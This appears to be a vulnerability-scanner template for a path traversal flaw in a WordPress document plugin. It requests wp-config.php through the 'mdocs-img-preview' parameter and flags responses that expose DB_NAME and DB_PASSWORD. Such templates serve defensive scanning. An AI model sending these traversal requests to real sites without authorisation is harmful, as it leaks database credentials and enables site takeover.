http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php'
  - '{{BaseURL}}/?mdocs-img-preview=../../../wp-config.php'
